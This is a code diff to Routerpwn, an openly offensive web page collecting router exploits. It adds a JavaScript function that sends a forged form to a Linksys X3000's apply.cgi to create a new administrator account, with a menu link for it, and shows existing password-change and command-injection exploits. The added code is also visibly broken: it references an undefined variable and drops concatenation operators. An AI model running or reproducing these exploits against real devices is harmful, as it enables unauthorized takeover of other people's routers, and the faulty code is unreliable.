@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.199</title>
+		<title>Routerpwn 1.13.200</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -310,6 +310,37 @@ function epc3925_changepassword(ip)
     form = '<input type="hidden" name="Password" value="attackers_password' + pwd + '"><input type="hidden" name="PasswordReEnter" value="' + pwd '"><input type="hidden" name="save" value="Save Settings">';
 	post('http://' + ip + '/goform/Quick_setup', form);
 
+}
+
+// Linksys X3000 - Add Admin Account
+function x3000_addadmin(ip)
+{
+	ip = ip || "192.168.1.1";
+	user = prompt("New User:");
+	pwd = prompt("New Password");
+	var form = '<input	type="hidden"	name="command" value="device_data"/>\
+	<input	type="hidden"	name="cur_ipaddr"	value="192.168.178.188"/>\
+	<input	type="hidden"	name="next_page"	value="StorageAdminUserAdd1.htm"/>\
+	<input	type="hidden"	name="redirect_timer"	value="0"/>\
+	<input	type="hidden"	name="reboot"	value="0"/>\
+	<input	type="hidden"	name="data1"	value=""/>\
+	<input	type="hidden"	name="next_page"	value=""/>\
+	<input	type="hidden"	name="submit_button" value="User_Properties"/>\
+	<input	type="hidden"	name="submit_type"	value="create_user"/>\
+	<input	type="hidden"	name="change_action"	value="gozila_cgi"/>\
+	<input	type="hidden"	name="Add_Account_Group_Name"	value=""/>\
+	<input	type="hidden"	name="access_group_name"	value=""/>\
+	<input	type="hidden"	name="delete_groups"	value=""/>\
+	<input	type="hidden"	name="Modify_Account_Name"	value=""/>\
+	<input	type="hidden"	name="Add_Account_Name"	value="' + name + '"/>\
+	<input	type="hidden"	name="full_name"	value="' + name '"/>\
+	<input	type="hidden"	name="user_desc"	value="' + name '"/>\
+	<input	type="hidden"	name="Add_Account_Password"	value="' + pwd '"/>\
+	<input	type="hidden"	name="Add_Account_PasswordConfirm"	value="' + name '"/>\
+	<input	type="hidden"	name="Add_Account_Group"	value="admin"/>\
+	</form>';
+	
+	post('http://' + ip + '/apply.cgi', form);
 }
 
 
@@ -2379,6 +2410,13 @@ a=a+1
 	<div><a href="http://www.s3cur1ty.de/m1adv2013-019">[+]</a></div>
 	<div><a href="javascript:x3000_command()">Linksys X3000 - OS Command Inyection</a></div>
 	<div><a href="javascript:x3000_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>06/22/13</div>
+	<div><a href="http://www.s3cur1ty.de/m1adv2013-019">[+]</a></div>
+	<div><a href="javascript:x3000_addadmin()">Linksys X3000 - Add Admin Account</a></div>
+	<div><a href="javascript:x3000_addadmin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <article>
